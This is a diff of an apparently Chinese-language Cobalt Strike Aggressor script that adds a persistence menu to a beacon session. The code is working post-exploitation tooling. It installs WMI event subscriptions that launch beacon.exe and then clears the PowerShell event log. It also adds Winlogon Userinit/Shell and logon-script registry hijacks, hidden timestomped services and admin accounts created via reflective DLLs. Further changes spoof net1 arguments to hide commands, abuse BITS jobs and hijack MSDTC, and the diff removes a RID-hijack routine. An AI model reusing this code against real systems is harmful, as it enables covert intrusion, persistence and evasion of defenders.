 							}else{
 								blog($bid, "WMI $Trigger Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -IntervalPeriod $IntervalPeriod -TimerId $TimerId");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1251,7 +1283,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI $Trigger Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -RunType $RunType -Trigger $Trigger -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -TimerId $TimerId -ExecutionTime \"".$ExecutionTime."\"");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1266,7 +1298,7 @@ menu "☆ 权限维持"{
 									dialog_show($Dialog);
 								}else{
 									blog($bid, "[*] WMI $Trigger Event Install");
-									bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 									bpowerpick($bid,"RegEventSubscription -RunType $RunType -Trigger $Trigger -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
 									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 								}				
@@ -1288,7 +1320,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI ProcessStart Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -ProcessName $ProcessName");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1306,7 +1338,7 @@ menu "☆ 权限维持"{
 							}
 							else{
 								blog($bid, "WMI InsertUSB Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1325,7 +1357,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI UserLogon Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -UserName $UserName -Domain $Domain");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}                                                                                                                               
@@ -1343,7 +1375,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI Interval Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -ScriptingEngine $ScriptingEngine -PermanentScript '".$Tmp."' -IntervalPeriod $IntervalPeriod -TimerId $TimerId");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1361,13 +1393,13 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI $Trigger Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -ScriptingEngine $ScriptingEngine -PermanentScript '".$Tmp."'  -TimerId $TimerId -ExecutionTime \"".$ExecutionTime."\"");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
 						}else if($Trigger eq "Reboot"){
 								blog($bid, "WMI $Trigger Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							
@@ -1392,7 +1424,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "[*] WMI ProcessStart Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -LocalScriptBlock {Start-Process C:\\beacon.exe} -ProcessName $ProcessName");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1411,7 +1443,7 @@ menu "☆ 权限维持"{
 							}
 							else{
 								blog($bid, "[*] WMI InsertUSB Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1433,7 +1465,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "[*] WMI UserLogon Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -UserName $UserName -Domain $Domain");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}                                                                                                                               
@@ -1453,7 +1485,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "[*] WMI Interval Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -IntervalPeriod $IntervalPeriod -TimerId $TimerId");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1471,13 +1503,13 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "[*] WMI $Trigger Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -LocalScriptBlock {Start-Process C:\\beacon.exe} -TimerId $TimerId -ExecutionTime \"".$ExecutionTime."\"");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
 						}else if($Trigger eq "Reboot"){
 								blog($bid, "[*] WMI $Trigger Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							
@@ -1517,11 +1549,11 @@ menu "☆ 权限维持"{
 				$Reg = $Key.$Prefix.replace($Item,"Winlogon Userinit","Winlogon");
 				if($Arch eq "x86"){
 					blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
-					bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
+					brun($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:32");
 				}
 				else{
 					blog($bid, "reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
-					bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
+					brun($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe, $+ $File\" /f /reg:64");
 				}
 			}else if($3['RegItem'] eq "Winlogon Shell"){  
 				# 当用户登录后才会执行（可能需要注销-登录触发）,64位系统执行64位注册表位置；32位系统执行32位注册表位置；
@@ -1538,10 +1570,10 @@ menu "☆ 权限维持"{
 				$Reg = $Key.$Prefix.replace($Item,"Winlogon Shell","Winlogon");
 				if($Arch eq "x86"){
 					blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
-					bshell($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
+					brun($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:32");
 				}else{
 					blog($bid, "reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
-					bshell($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
+					brun($bid,"reg add  $+ $Reg /v Shell /t REG_SZ /d \"explorer.exe, $+ $File\" /f /reg:64");
 				}		
 			}else if($3['RegItem'] eq "Logon Scripts"){
 				# SYSTEM(32位)权限下对该注册表项的查询、写入操作都被重定向到32位，加/reg:64也无效。 ,
@@ -1561,10 +1593,10 @@ menu "☆ 权限维持"{
 				}
 				if($Arch eq "x86"){
 					blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
-					bshell($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
+					brun($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:32");
 				}else{
 					blog($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
-					bshell($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
+					brun($bid,"reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File\" /f /reg:64");
 				}
 			}
 			else{
@@ -1573,11 +1605,11 @@ menu "☆ 权限维持"{
 					blog($bid,"\c4 KeyName Not Input.");
 				}else{
 					if($Arch eq "x86"){
-						blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:32");
-						bshell($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:32");
+						blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:32");
+						brun($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:32");
 					}else{
-						blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:64");
-						bshell($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \" $+ $File\" /f /reg:64");
+						blog($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:64");
+						brun($bid,"reg add  $+ $Reg /v $KeyName /t REG_SZ /d \"\\\" $+ $File\"\\\" /f /reg:64");
 					}
 				}
 			}
@@ -1701,8 +1733,6 @@ menu "☆ 权限维持"{
 				}
 			}
 		}
-
-
 		# Service
 		#添加服务  @("自启动","延时启动","手动启动","触发器启动", "启动失败回调"));
 		sub InstallAutoService{
@@ -1767,8 +1797,8 @@ menu "☆ 权限维持"{
 					#sc failure Wdfup reset=5000 actions=run/500 command="C:\Users\Administrator\Desktop\Powershell\beacon.exe"
 					
 					# 1. 上传服务程序到system32,
-					blog($bid,"Upload ".script_resource("Persistence/Modules/Exitservice/uinit.exe")." to ".$serviceFile);
-					bupload_raw($bid, $serviceFile, readb(openf(script_resource("Persistence/Modules/Exitservice/uinit.exe")), -1));
+					blog($bid,"Upload ".script_resource("scripts/AuthMaintainExitservice/uinit.exe")." to ".$serviceFile);
+					bupload_raw($bid, $serviceFile, readb(openf(script_resource("scripts/AuthMaintainExitservice/uinit.exe")), -1));
 					btimestomp($bid, $serviceFile, "C:\\windows\\regedit.exe");
 					
 					# 2.  创建服务
@@ -1832,14 +1862,14 @@ menu "☆ 权限维持"{
 						if(binfo($bid, "arch") eq "x86"){
 							blog($bid,"Beacon Arch is x86,The file will be upload in C:\\windows\\SysWOW64\\");
 						}
-						blog($bid,"Upload ".script_resource("Persistence/Modules/Exitservice/uinit.exe")." to $serviceFile");			
-						$handle = openf(script_resource("Persistence/Modules/Exitservice/uinit.exe"));
+						blog($bid,"Upload ".script_resource("scripts/AuthMaintainExitservice/uinit.exe")." to $serviceFile");			
+						$handle = openf(script_resource("scripts/AuthMaintainExitservice/uinit.exe"));
 						$bdata   = readb($handle, -1);
 						closef($handle);#关闭句柄，不关的话文件会被锁定
 						bupload_raw($bid, $serviceFile, $bdata );
 					}else{
-						blog($bid,"Upload ".script_resource("Persistence/Modules/Services/TransitEXE.exe")." to $serviceFile");	
-						$handle = openf(script_resource("Persistence/Modules/Services/TransitEXE.exe"));
+						blog($bid,"Upload ".script_resource("scripts/AuthMaintainServices/TransitEXE.exe")." to $serviceFile");	
+						$handle = openf(script_resource("scripts/AuthMaintainServices/TransitEXE.exe"));
 						$bdata   = readb($handle, -1);
 						closef($handle);#关闭句柄，不关的话文件会被锁定
 						bupload_raw($bid, $serviceFile,$bdata);
@@ -1847,10 +1877,9 @@ menu "☆ 权限维持"{
 					$Data = replace(URLencode($Name),'\+','%20')."|".replace(URLencode($Displayname),'\+','%20')."|".$serviceFile."|".$File."|".$cmdline."|".replace(URLencode($Description),'\+','%20') ."|".$Type."|".$sddla."|"."start";
 				}
 				btask($bid,$Data);
-				bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Services/reflective_dll.dll"),$Data, "Use API add Service", 5000);	
+				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Services/reflective_dll.dll"),$Data, "Use API add Service", 5000);	
 			}
 		}
-
 		#修改服务,使用config , description 选项
 		sub ChangeAutoService{
 			local('$Name $File $Displayname $Description $bid');
@@ -1867,8 +1896,6 @@ menu "☆ 权限维持"{
 			bshell($bid,"sc description \" $+ $Name\" \" $+ $Description\"")
 			bshell($bid, "net start \" $+ $Name\"");		
 		}
-
-
 		#隐藏服务,sc sdset设置服务安全描述符定义语言(SDDL)
 		sub HiddenService{
 			local('$Name $SDL $bid');
@@ -1920,14 +1947,17 @@ menu "☆ 权限维持"{
 			}
 		}
 
-		sub EnGuest{
-			local('$User $Pwd $groups $bid $Type $Do');
+		sub ChangeAccount{
+			local('$User $Pwd $groups $bid $Type $Do $Parameter $comment $tmp');
 			$bid = $3['bid'];
 			$User = $3['user'];
 			$Pwd = $3['pass'];
 			$groups = $3['localgroups'];
-			$Type = $3['addtype'];  #API NET 
-			$Do = $3['DoFt'];       #禁用 、启用、删除组用户
+			$tmp = replace($3['comment'],' ','');
+			$tmp = replace($tmp,'|','');
+			
+			$Type = $3['addtype'];   #API NET 
+			$Do = $3['DoFt'];        #禁用 、启用、删除组用户
 			#启用
 			if($Do eq "enable"){
 				#net 命令启用
@@ -1938,10 +1968,18 @@ menu "☆ 权限维持"{
 					bshell($bid, "net user $User $Pwd");
 				}else if($Type eq "API"){
 					# API 启用
-					blog($bid, "Use API to Enable user $User");
-					blog($bid, "Parameter is:$User $+ ,1 $+ ,$groups $+ ,$Pwd");
 					# Guest,1,administrators,password  启用Guest,加入管理组,设置密码
-					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,1 $+ ,$groups $+ ,$Pwd", "EnGuest API", 5000);	
+					
+					blog($bid, "Use API to Enable account $User");
+					if($comment eq ""){
+						$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|0000";
+					}else{
+						$comment = URLencode($tmp); #账户描述 
+						$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".$comment;
+					}
+
+					blog($bid, "$Parameter");
+					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "enable account", 5000);	
 				}else{
 					blog($bid, "0");
 				}
@@ -1953,9 +1991,12 @@ menu "☆ 权限维持"{
 					bshell($bid, "net localgroup $groups $User /del");
 					bshell($bid, "net user $User /active:no");
 				}else if($Type eq "API"){
-					blog($bid, "Use API to Enable user Guest.");
-					# Guest,0,administrators,password  禁用Guest,移除管理组,设置密码(不会执行)
-					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,0 $+ ,$groups $+ ,$Pwd", "EnGuest API", 5000);	
+					blog($bid, "Use API to disable account $User");
+					# Guest,0,administrators,password  禁用Guest,移除所属组,设置密码(不会执行)
+					
+					$Parameter = "DisableUser"."|".$User."|1|".$groups."|1";
+					blog($bid, "$Parameter");
+					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "disable account", 5000);	
 				}else{
 					
 				}
@@ -1967,19 +2008,23 @@ menu "☆ 权限维持"{
 				}else if($Type eq "API"){
 					blog($bid, "Use API to Remove user $User in Groups $groups");
 					# Guest,3,administrators,password  移除用户所属组(因为如果guest在管理组里,下次激活会失败),设置密码(不会执行)
-					bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,3 $+ ,$groups $+ ,$Pwd", "EnGuest API", 5000);	
+				
+					$Parameter = "DelUserFromGroup"."|".$User."|".$Pwd."|".$groups."|1";
+					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "DelUserFromGroup", 5000);	
 				}else{
 					
 				}
 			}
 		}
+
 		sub AdUser{
-			local('$User $Pwd $groups $bid $Type');
+			local('$User $Pwd $groups $bid $Type $Parameter $comment $tmp $length1 $length2 $cmd1 $cmd2');
 			$bid = $3['bid'];
 			$User = $3['user'];
 			$Pwd = $3['pass'];
 			$groups = $3['localgroups'];
 			$Type = $3['addtype'];
+			$comment = replace($3['comment'],' ','');
 			if($Type eq "NET"){
 				blog($bid, "net1 user $User $Pwd /add");
 				blog($bid, "net1 localgroup $groups $User /add");
@@ -1987,21 +2032,33 @@ menu "☆ 权限维持"{
 				bshell($bid, "net1 localgroup $groups $User /add");
 			}
 			else if($Type eq "API"){
-				blog($bid,"ShadowUser.exe $User $Cuser $Pwd");
-				bexecute_assembly($bid, script_resource("Persistence/Modules/AdUserApi/HaryyUser.exe"), "-u $User -p $Pwd -g $groups");
-			}else{
-
+				if($comment eq ""){
+					$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|0000";
+				}else{
+					$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".URLencode($comment);
+				}
+				blog($bid,"$Parameter");
+				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "AdUser", 5000);	
+				
+				
+				
+			}else if ($Type eq "SpoofArg"){
+				$cmd1 = "net1 user $User $Pwd /add";
+				$cmd2 = "net1 localgroup $groups $User /add";
+				blog($bid, "$cmd1");
+				blog($bid, "$cmd2");
+				$length1 = strlen($cmd1);
+				$length2 = strlen($cmd2);
+				if($length1  > $length2) {
+					bargue_add($bid, "net1", randomFileName($length1));
+				}
+				else{
+					bargue_add($bid, "net1", randomFileName($length2));
+				}
+				brun($bid, $cmd1);
+				brun($bid, $cmd2);
+				bargue_remove($bid, "net1");
 			}
-		}
-
-		sub CloneUser{
-			local('$bid $User $Pwd $Cuser');
-			$bid = $3['bid'];
-			$User = $3['user'];
-			$Pwd = $3['pass'];
-			$Cuser = $3['cloneuser'];
-			blog($bid,"ShadowUser.exe $User $Cuser $Pwd");
-			bexecute_assembly($bid, script_resource("Persistence/Modules/ShadowUser/scvhost.exe"), "$User $Cuser $Pwd");
 		}
 
 		sub DeleteUser{
@@ -2013,9 +2070,9 @@ menu "☆ 权限维持"{
 				blog($bid, "net user $User /del");
 				bshell($bid, "net user $User /del");
 			}else if($Type eq "API"){
-				btask($bid, "Use API to Delete user $User");
-				# Guest,4,administrators,password  删除用户
-				bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,4 $+ ,0 $+ ,0", "EnGuest API", 5000);	
+				$Parameter = "DelUser"."|".$User."|1|1|1";
+				blog($bid,"$Parameter");
+				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "DelUser", 5000);					
 			}	
 		}
 
@@ -2046,13 +2103,15 @@ menu "☆ 权限维持"{
 		}
 
 		sub randomFileName{
+			local('$int');
+			$int = $1;
 			$str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 			$random = [new Random];
 			$filenameRand = [new StringBuffer];
-			for ($x = 0; $x < 6; $x++)
+			for ($x = 0; $x < $int; $x++)
 				{
 					$number = [$random nextInt:int(strlen($str))]; #随机数
-					println($number);
+					# println($number);
 					$char = charAt($str, $number);
 					[$filenameRand append: $char ];
 				}
@@ -2066,7 +2125,7 @@ menu "☆ 权限维持"{
 			$CmdLine =  $3['CmdLine'];
 			blog($bid, "Bitsadmin Jobs Name: \"$JobName\"");
 			brun($bid, "bitsadmin /rawreturn /create $JobName");
-			brun($bid, "bitsadmin /rawreturn /addfile $JobName C:\\Windows\\System32\\user32.dll C:\\Windows\\Temp\\Documents\\user32.gif");
+			brun($bid, "bitsadmin /rawreturn /addfile $JobName C:\\Windows\\System32\\user32.dll C:\\Users\\Public\\Documents\\user32.gif");
 			brun($bid, "bitsadmin /rawreturn /setnotifycmdline $JobName $CmdLine");
 			brun($bid, "bitsadmin /rawreturn /setpriority $JobName high"); # 设置指定作业的优先级。 FOREGROUND HIGH NORMAL LOW
 			brun($bid, "bitsadmin /rawreturn /resume $JobName");
@@ -2108,7 +2167,7 @@ menu "☆ 权限维持"{
 						brun($bid,"sc stop msdtc");
 						brun($bid,"sc config msdtc start= auto obj= LocalSystem");
 						$Data = pack("I-", 1) . "MSDTC"; # 为1的时候就是启动，0就为卸载
-						bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Msdtc32/MoveFileEx.dll"),$Data, "Move Wow64 File To system32", 5000);
+						bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/MoveFileEx.dll"),$Data, "Move Wow64 File To system32", 5000);
 						blog($bid,"sc start msdtc");
 						brun($bid,"sc start msdtc");	
 					}
@@ -2119,7 +2178,7 @@ menu "☆ 权限维持"{
 				#drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");
 				#drow_listener_stage($Dialog, "listener", "Stage: ");
 			}
-		}		
+		}	
 	}
 
 	separator();
@@ -2155,22 +2214,11 @@ menu "☆ 权限维持"{
         WmiPrvSE_config($bid);
     }
     
-    item "CacheTask任务计划COM接口劫持" {
+    item "CacheTask COM 劫持" {
 		blog($1, "\c9=========== CacheTask任务计划COM接口劫持 ==========");
         CacheTask($bid);
     }
     
-    menu "RID劫持"{
-        item "本地windows用户RID查询" {
-		blog($1, "\c9=========== 本地windows用户RID查询 ==========");
-            ridquery($bid);
-        }
-        
-        item "RID劫持" {
-		blog($1, "\c9=========== RID劫持 ==========");
-            ridrun($bid);
-        }
-    }
 	  item "白银票据" {
 		blog($1, "\c9=========== 白银票据 ==========");
     $bid = $1['@'];
@@ -2389,43 +2437,6 @@ sub servicebeacon{
 		dialog_show($dialog);
 	}
 
-}
-
-sub ridquery{
-	$command = "\$data=Get-WmiObject -Class Win32_UserAccount | Select-Object Name,SID
-foreach(\$n in \$data){
-	\$username=\$n.Name
-	\$sid=\$n.SID  -split \"-\"
-	\$sid=[Convert]::ToString(\$sid[-1],16)
-	\$number=\$sid.Length%2
-	if(\$number -eq 1){
-		\$rid=\"0\"+\$sid
-		\$rid=[System.String]::Join(\"\",\$rid[-2..-1]+\$rid[0..1])
-	}
-	write-host \"Name:\"\$username \"Sid:\"\$sid \"Rid:\"\$rid
-}";
-	foreach $id ($bid){
-		bpowerpick($id, $command);
-	}
-}
-
-sub ridhijack{
-	$handle = openf(script_resource("ridhijack.ps1"));
-	$data = readb($handle, -1);
-	closef($handle);
-	$data = replace($data, "XXXXXXXXXXXX", $3['rid']);
-	bpowerpick($3['bid'], $data);
-}
-
-
-sub ridrun{
-	foreach $id ($bid){
-		$dialog = dialog("Rid Hijack", %(rid => "f401", bid => $id), &ridhijack);
-		dialog_description($dialog, "RID劫持，将Guest的RID改为别的用户的RID");
-		drow_text($dialog, "rid", "RID:");
-		dbutton_action($dialog, "Run");
-		dialog_show($dialog);
-	}
 }
 
 
